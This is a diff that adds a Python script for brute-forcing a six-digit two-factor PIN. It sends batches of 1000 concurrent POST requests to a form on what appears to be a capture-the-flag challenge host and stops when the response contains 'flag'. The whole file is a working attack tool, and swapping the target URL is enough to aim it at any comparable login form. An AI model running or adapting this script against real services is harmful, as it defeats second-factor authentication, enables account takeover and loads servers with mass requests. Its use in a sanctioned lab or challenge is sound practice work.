@@ -1,0 +1,52 @@
+import itertools
+import aiohttp
+import asyncio
+
+# Configuration
+TARGET_URL = "https://blackrock-d6aeb6b1d709-2fa-1.chals.io/2fa"  # Replace with the actual URL
+SUCCESS_INDICATOR = "flag"  # Replace with the unique success string that indicates a successful login
+
+async def attempt_login(session, pincode):
+    """Attempt to submit the pincode to the 2FA form asynchronously."""
+    data = {
+        'pincode.1': pincode[0],
+        'pincode.2': pincode[1],
+        'pincode.3': pincode[2],
+        'pincode.4': pincode[3],
+        'pincode.5': pincode[4],
+        'pincode.6': pincode[5]
+    }
+
+    try:
+        async with session.post(TARGET_URL, data=data) as response:
+            text = await response.text()
+            if SUCCESS_INDICATOR in text.lower():
+                print(f"Success! The pincode is: {pincode}")
+                return True
+    except Exception as e:
+        print(f"Request failed for pincode {pincode}: {e}")
+    
+    return False
+
+async def main():
+    digits = '0123456789'
+    pincodes = (''.join(pincode) for pincode in itertools.product(digits, repeat=6))
+
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for pincode in pincodes:
+            tasks.append(attempt_login(session, pincode))
+
+            # Batch of requests sent concurrently (e.g., 1000 requests at once)
+            if len(tasks) >= 1000:  
+                results = await asyncio.gather(*tasks)
+                if any(results):  # If one of the attempts was successful, stop the brute-force
+                    break
+                tasks = []  # Reset tasks for the next batch
+
+        # Run any remaining tasks if less than 1000 remain
+        if tasks:
+            await asyncio.gather(*tasks)
+
+if __name__ == "__main__":
+    asyncio.run(main())
